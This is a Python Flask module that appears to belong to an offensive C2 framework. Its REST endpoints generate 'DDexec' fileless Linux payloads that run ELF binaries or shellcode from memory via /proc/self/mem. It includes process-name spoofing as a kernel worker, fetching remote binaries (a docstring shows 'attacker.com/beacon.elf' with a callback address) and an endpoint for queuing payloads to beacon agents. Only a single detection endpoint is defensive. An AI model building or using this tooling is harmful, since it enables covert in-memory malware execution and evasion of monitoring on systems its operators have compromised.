"""
DDexec Fileless Execution API Routes
=====================================
Flask blueprint for DDexec Linux fileless execution module.
Provides REST API endpoints for generating fileless payloads.
"""

from flask import Blueprint, request, jsonify, render_template
import os
import hashlib
import base64
from datetime import datetime

# Import DDexec module
try:
    from cybermodules.dd_executor import (
        DDExecBuilder,
        DDExecDetector,
        create_fileless_payload,
        create_remote_payload
    )
    DDEXEC_AVAILABLE = True
except ImportError:
    DDEXEC_AVAILABLE = False

ddexec_bp = Blueprint('ddexec', __name__, url_prefix='/ddexec')


@ddexec_bp.route('/')
@ddexec_bp.route('/dashboard')
def ddexec_dashboard():
    """DDexec fileless execution dashboard"""
    return render_template('ddexec_dashboard.html')


@ddexec_bp.route('/api/status', methods=['GET'])
def ddexec_status():
    """Check DDexec module availability"""
    return jsonify({
        "module": "ddexec",
        "name": "DDexec Fileless Execution",
        "available": DDEXEC_AVAILABLE,
        "version": "1.0.0",
        "features": [
            "Binary to fileless payload conversion",
            "x86_64 and aarch64 support",
            "Process name spoofing",
            "Compression support",
            "Remote URL execution",
            "Shellcode execution"
        ]
    })


@ddexec_bp.route('/api/generate', methods=['POST'])
def generate_payload():
    """
    Generate DDexec fileless execution payload.
    
    Request body (JSON):
    {
        "binary_b64": "<base64 encoded ELF binary>",
        "argv0": "[kworker/0:0]",  // optional: fake process name
        "args": ["--arg1", "value"],  // optional: arguments
        "compress": true,  // optional: compress before encoding
        "architecture": "auto",  // optional: auto, x86_64, aarch64
        "seeker": "tail"  // optional: tail, dd, hexdump
    }
    
    Returns:
    {
        "success": true,
        "payload": {
            "command": "bash -c '...'",
            "architecture": "x86_64",
            "hash_md5": "abc123...",
            "size_bytes": 12345,
            "compressed": true
        }
    }
    """
    if not DDEXEC_AVAILABLE:
        return jsonify({
            "success": False,
            "error": "DDexec module not available"
        }), 500
    
    try:
        data = request.get_json() or {}
        
        # Get binary data
        binary_b64 = data.get('binary_b64')
        if not binary_b64:
            return jsonify({
                "success": False,
                "error": "binary_b64 is required"
            }), 400
        
        try:
            binary_data = base64.b64decode(binary_b64)
        except Exception as e:
            return jsonify({
                "success": False,
                "error": f"Invalid base64: {str(e)}"
            }), 400
        
        # Validate ELF
        if binary_data[:4] != b'\x7fELF':
            return jsonify({
                "success": False,
                "error": "Not a valid ELF binary"
            }), 400
        
        # Build payload
        builder = DDExecBuilder(
            architecture=data.get('architecture', 'auto'),
            seeker=data.get('seeker', 'tail'),
            compress=data.get('compress', True)
        )
        
        payload = builder.generate_payload(
            binary_data=binary_data,
            argv0=data.get('argv0', ''),
            args=data.get('args', [])
        )
        
        return jsonify({
            "success": True,
            "payload": {
                "command": payload.command,
                "architecture": payload.architecture,
                "seeker": payload.seeker,
                "argv0": payload.argv0,
                "args": payload.args,
                "hash_md5": payload.hash_md5,
                "size_bytes": payload.size_bytes,
                "compressed": payload.compressed
            },
            "timestamp": datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@ddexec_bp.route('/api/generate-remote', methods=['POST'])
def generate_remote_payload():
    """
    Generate DDexec payload for remote binary fetch.
    
    Request body:
    {
        "url": "https://attacker.com/beacon.elf",
        "argv0": "[kworker/0:0]",
        "args": ["--callback", "10.0.0.1"]
    }
    """
    if not DDEXEC_AVAILABLE:
        return jsonify({
            "success": False,
            "error": "DDexec module not available"
        }), 500
    
    try:
        data = request.get_json() or {}
        
        url = data.get('url')
        if not url:
            return jsonify({
                "success": False,
                "error": "url is required"
            }), 400
        
        builder = DDExecBuilder(
            seeker=data.get('seeker', 'tail')
        )
        
        command = builder.generate_remote_payload(
            url=url,
            argv0=data.get('argv0', ''),
            args=data.get('args', [])
        )
        
        return jsonify({
            "success": True,
            "payload": {
                "command": command,
                "type": "remote",
                "url": url
            },
            "timestamp": datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@ddexec_bp.route('/api/generate-shellcode', methods=['POST'])
def generate_shellcode_payload():
    """
    Generate DDexec payload for direct shellcode execution.
    
    Request body:
    {
        "shellcode_b64": "<base64 encoded shellcode>",
        "shellcode_hex": "909090...",  // alternative format
        "architecture": "x86_64"
    }
    """
    if not DDEXEC_AVAILABLE:
        return jsonify({
            "success": False,
            "error": "DDexec module not available"
        }), 500
    
    try:
        data = request.get_json() or {}
        
        # Get shellcode
        if 'shellcode_b64' in data:
            shellcode = base64.b64decode(data['shellcode_b64'])
        elif 'shellcode_hex' in data:
            shellcode = bytes.fromhex(data['shellcode_hex'])
        else:
            return jsonify({
                "success": False,
                "error": "shellcode_b64 or shellcode_hex required"
            }), 400
        
        builder = DDExecBuilder()
        command = builder.generate_shellcode_payload(
            shellcode=shellcode,
            architecture=data.get('architecture', 'x86_64')
        )
        
        return jsonify({
            "success": True,
            "payload": {
                "command": command,
                "type": "shellcode",
                "size_bytes": len(shellcode),
                "architecture": data.get('architecture', 'x86_64')
            },
            "timestamp": datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@ddexec_bp.route('/api/detect', methods=['POST'])
def detect_ddexec():
    """
    Analyze command for DDexec indicators (defensive).
    
    Request body:
    {
        "command": "bash -c 'exec 7>/proc/self/mem...'"
    }
    """
    if not DDEXEC_AVAILABLE:
        return jsonify({
            "success": False,
            "error": "DDexec module not available"
        }), 500
    
    try:
        data = request.get_json() or {}
        
        command = data.get('command', '')
        if not command:
            return jsonify({
                "success": False,
                "error": "command is required"
            }), 400
        
        result = DDExecDetector.check_command(command)
        
        return jsonify({
            "success": True,
            "detection": result,
            "timestamp": datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@ddexec_bp.route('/api/quick', methods=['POST'])
def quick_payload():
    """
    Quick endpoint for generating basic DDexec payload.
    Accepts file upload or base64.
    """
    if not DDEXEC_AVAILABLE:
        return jsonify({
            "success": False,
            "error": "DDexec module not available"
        }), 500
    
    try:
        # Check for file upload
        if 'binary' in request.files:
            binary_file = request.files['binary']
            binary_data = binary_file.read()
            argv0 = request.form.get('argv0', binary_file.filename or 'payload')
        else:
            # JSON request
            data = request.get_json() or {}
            binary_b64 = data.get('binary_b64')
            if not binary_b64:
                return jsonify({
                    "success": False,
                    "error": "binary file or binary_b64 required"
                }), 400
            binary_data = base64.b64decode(binary_b64)
            argv0 = data.get('argv0', 'payload')
        
        # Generate payload
        builder = DDExecBuilder(compress=True)
        payload = builder.generate_payload(
            binary_data=binary_data,
            argv0=argv0
        )
        
        return jsonify({
            "success": True,
            "command": payload.command,
            "hash_md5": payload.hash_md5,
            "architecture": payload.architecture
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


# Agent integration endpoint
@ddexec_bp.route('/api/agent/<agent_id>/execute', methods=['POST'])
def agent_execute_ddexec(agent_id: str):
    """
    Execute DDexec payload on a connected agent.
    
    This integrates with the C2 beacon infrastructure to send
    fileless execution commands to Linux agents.
    """
    if not DDEXEC_AVAILABLE:
        return jsonify({
            "success": False,
            "error": "DDexec module not available"
        }), 500
    
    try:
        data = request.get_json() or {}
        
        # Get payload options
        binary_b64 = data.get('binary_b64')
        remote_url = data.get('url')
        
        if binary_b64:
            binary_data = base64.b64decode(binary_b64)
            builder = DDExecBuilder(compress=True)
            payload = builder.generate_payload(
                binary_data=binary_data,
                argv0=data.get('argv0', '[kworker/0:0]'),
                args=data.get('args', [])
            )
            command = payload.command
        elif remote_url:
            builder = DDExecBuilder()
            command = builder.generate_remote_payload(
                url=remote_url,
                argv0=data.get('argv0', '[kworker/0:0]'),
                args=data.get('args', [])
            )
        else:
            return jsonify({
                "success": False,
                "error": "binary_b64 or url required"
            }), 400
        
        # TODO: Integrate with actual agent communication
        # This would queue the command for the specified agent
        # For now, return the generated payload
        
        return jsonify({
            "success": True,
            "agent_id": agent_id,
            "command": command,
            "queued": True,
            "message": f"DDexec payload queued for agent {agent_id}",
            "timestamp": datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500
